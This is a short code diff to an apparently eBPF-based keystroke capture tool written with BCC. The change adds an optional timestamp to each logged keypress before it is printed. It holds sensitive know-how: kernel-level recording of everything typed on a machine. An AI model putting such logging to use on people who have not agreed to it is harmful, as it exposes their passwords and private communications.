@@ -18,6 +18,7 @@ import os, sys
 import atexit
 import signal
 import time
+from datetime import datetime
 
 from bcc import BPF
 
@@ -52,9 +53,13 @@ class BPFProgram():
         def keypress(cpu, data, size):
             event = self.bpf["keypresses"].event(data)
             key = translate_keycode(event.code, ctrl=event.ctrl, alt=event.alt, shift=event.shift, meta=event.meta)
-            if key:
-                print(f"{key}")
-                sys.stdout.flush()
+            if not key:
+                return
+            msg = key
+            if self.args.timestamp:
+                now = datetime.now()
+                msg = f"[{now.year:02d}/{now.month:02d}/{now.day:02d} {now.hour:02d}:{now.minute:02d}:{now.second:02d}] {msg}"
+            print(msg, flush=True)
         self.bpf["keypresses"].open_perf_buffer(keypress)
 
     def load_bpf(self):
